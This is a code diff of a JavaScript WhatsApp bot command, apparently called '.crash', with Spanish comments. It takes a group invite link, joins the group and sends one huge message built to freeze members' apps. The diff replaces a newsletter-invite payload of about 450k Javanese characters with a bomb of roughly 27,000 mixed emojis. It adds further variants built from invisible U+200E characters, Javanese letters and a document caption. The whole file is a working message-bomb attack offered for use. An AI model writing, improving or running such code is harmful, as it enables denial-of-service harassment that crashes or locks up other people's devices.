@@ -1,65 +1,61 @@
 export default {
   name: ["crash"],
-  description: "Traba de un solo mensaje: bomba de payload máximo",
+  description: "Bomba de emojis: traba el grupo con UN solo mensaje",
   category: 'owner',
   ownerOnly: true,
 
   async run({ sock, from, text, cmdName, reply }) {
     if (!text || !text.includes('whatsapp.com')) {
-      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX` });
+      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX [emoji|oculto|texto|doc]` });
     }
 
     const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
     if (!match) return reply({ text: '😡 Enlace inválido.' });
-
-    // Arma opcional: .crash <link> [texto|doc|canal]
-    const tipo = (text.trim().split(/\s+/)[1] || 'canal').toLowerCase();
+    const code = match[1];
+    const tipo = (text.trim().split(/\s+/)[1] || 'emoji').toLowerCase();
 
     let groupId;
     try {
-      groupId = (await sock.groupGetInviteInfo(match[1])).id;
+      groupId = (await sock.groupGetInviteInfo(code)).id;
     } catch {
-      return reply({ text: '⚠️ No se pudo obtener el ID del grupo. Revisa el enlace.' });
+      return reply({ text: '⚠️ No pude leer el grupo. Enlace inválido o expirado.' });
     }
 
-    // Carácter más caro de renderizar (cámbialo si quieres probar otro)
-    const CHAR = 'ꦾ';                     // javanés
-    // Alternativas pesadas: '𑇂𑆵𑆴𑆿' (astral)  |  '👨👩👧👦' (ZWJ)
+    // Por si el bot no está dentro (si ya está, esto no hace daño)
+    try { await sock.groupAcceptInvite(code); } catch {}
 
-    const BOMB  = CHAR.repeat(65000);     // payload de texto máximo
-    const NOMBRE = CHAR.repeat(90000).repeat(5); // ~450k chars sin tope real
+    // BOMBA DE EMOJIS: esto es lo que de verdad desborda el búfer.
+    // Mezcla de emojis distintos = más glifos que cargar, más traba.
+    const SET = '😭🔥💀👻🤖💥🌟🍕🚀🎉😂😍😱🥶🤯👽🎃🧠🍀⚡🌈🐉🦖🌋🎯🥵😵‍💫🫠👾🤡🦄🍩☠️🎸🏆💎🧨🔮🪐🌙⭐🎈🥳🤩😎';
+    const EMOJI = SET.repeat(600); // ~27.000 emojis en un solo mensaje
 
-    const THUMB = Buffer.from(
-      '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==',
-      'base64'
-    );
-
-    // Cada arma = UN solo mensaje, pero maxeado
     const armas = {
-      texto: () => sock.sendMessage(groupId, { text: BOMB }),
+      emoji:  () => sock.sendMessage(groupId, { text: EMOJI }),
 
-      doc: () => sock.sendMessage(groupId, {
-        document: Buffer.from('\u200E'.repeat(8000)),
-        fileName: CHAR.repeat(255),
+      // Caracteres invisibles (el clásico "texto bomba")
+      oculto: () => sock.sendMessage(groupId, { text: '\u200E'.repeat(32000) }),
+
+      // Letras javanesas (por si quieres comparar)
+      texto:  () => sock.sendMessage(groupId, { text: 'ꦾ'.repeat(32000) }),
+
+      // Emojis como caption de documento
+      doc:    () => sock.sendMessage(groupId, {
+        document: Buffer.from('\u200E'.repeat(4000)),
+        fileName: 'bomba.doc',
         mimetype: 'application/msword',
-        caption: BOMB,
+        caption: EMOJI,
       }),
-
-      canal: () => sock.relayMessage(groupId, {
-        newsletterAdminInviteMessage: {
-          newsletterJid: '120363229729656123@newsletter',
-          newsletterName: 'ADOi' + NOMBRE,
-          jpegThumbnail: THUMB,
-          caption: BOMB,
-          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`,
-        },
-      }, {}),
     };
 
-    const arma = armas[tipo] || armas.canal;
+    const arma = armas[tipo] || armas.emoji;
 
     const t = Date.now();
-    await arma();
+    try {
+      await arma();
+    } catch (e) {
+      return reply({ text: `❌ Falló el envío (${tipo}): ${e.message}` });
+    }
+
     await reply({ text: `💥 Bomba *${tipo}* lanzada a ${groupId} · ${Date.now() - t} ms` });
   },
 };
